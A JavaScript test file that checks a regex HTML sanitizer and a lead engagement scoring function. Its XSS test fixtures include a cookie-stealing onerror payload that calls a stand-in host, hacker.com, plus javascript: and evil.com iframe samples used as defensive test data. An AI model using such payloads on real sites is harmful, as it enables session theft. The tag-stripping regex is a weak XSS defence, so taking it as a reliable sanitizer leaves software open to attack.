import test from "node:test";
import assert from "node:assert/strict";

/**
 * AI Lead Intent & XSS Sanitization Test Suite
 * Validates mathematical intent scoring algorithms (0-100) and HTML tag sanitization.
 */

function sanitizeHtmlInput(input) {
  if (typeof input !== "string") return "";
  return input.replace(/<[^>]*>?/gm, "").trim();
}

function calculateLeadIntentScore({ totalDwellSec, completionRate, revisitCount, ndaAgreed }) {
  // 1. Dwell score (0-35)
  const dwellScore = Math.min(35, (totalDwellSec / 180) * 35);
  // 2. Completion score (0-25)
  const compScore = (completionRate / 100) * 25;
  // 3. Revisit score (0-20)
  const revisitScore = Math.min(20, (revisitCount / 3) * 20);
  // 4. Agreement bonus (0-20)
  const bonusScore = ndaAgreed ? 20 : 5;

  const total = Math.round(dwellScore + compScore + revisitScore + bonusScore);
  const finalScore = Math.min(100, Math.max(0, total));

  let level = "cold";
  if (finalScore >= 85) level = "hot";
  else if (finalScore >= 60) level = "warm";

  return { score: finalScore, level };
}

test("XSS Defense: Strips all malicious script tags and event handlers", () => {
  const dirtyInputs = [
    '<script>alert("XSS")</script>What is the valuation?',
    '<img src=x onerror="fetch(`http://hacker.com?c=`+document.cookie)" />Slide 3 query',
    '<a href="javascript:steal()">Click Here</a>',
    '<b>Bold</b> question with <iframe src="evil.com"></iframe>',
  ];

  for (const dirty of dirtyInputs) {
    const clean = sanitizeHtmlInput(dirty);
    assert.equal(/<script/i.test(clean), false, "Must not contain script tags");
    assert.equal(/onerror/i.test(clean), false, "Must not contain inline event handlers");
    assert.equal(/<iframe/i.test(clean), false, "Must not contain iframes");
    assert.ok(clean.length > 0, "Clean text must remain intact");
  }
});

test("AI Lead Scoring: High engagement calculates as 🔥 HOT DEAL (85-100)", () => {
  const hotLead = calculateLeadIntentScore({
    totalDwellSec: 300, // 5 minutes
    completionRate: 100, // Read all pages
    revisitCount: 3, // Returned 3 times
    ndaAgreed: true,
  });

  assert.ok(hotLead.score >= 85, `Expected score >= 85, got ${hotLead.score}`);
  assert.equal(hotLead.level, "hot");
});

test("AI Lead Scoring: Moderate engagement calculates as ⚡ WARM (60-84)", () => {
  const warmLead = calculateLeadIntentScore({
    totalDwellSec: 120, // 2 minutes
    completionRate: 70, // Read 70%
    revisitCount: 1,
    ndaAgreed: true,
  });

  assert.ok(warmLead.score >= 60 && warmLead.score < 85, `Expected 60-84, got ${warmLead.score}`);
  assert.equal(warmLead.level, "warm");
});

test("AI Lead Scoring: Quick bounce calculates as ❄️ CASUAL/COLD (0-59)", () => {
  const coldLead = calculateLeadIntentScore({
    totalDwellSec: 10, // 10 seconds
    completionRate: 20, // Saw 1 page
    revisitCount: 0,
    ndaAgreed: false,
  });

  assert.ok(coldLead.score < 60, `Expected score < 60, got ${coldLead.score}`);
  assert.equal(coldLead.level, "cold");
});
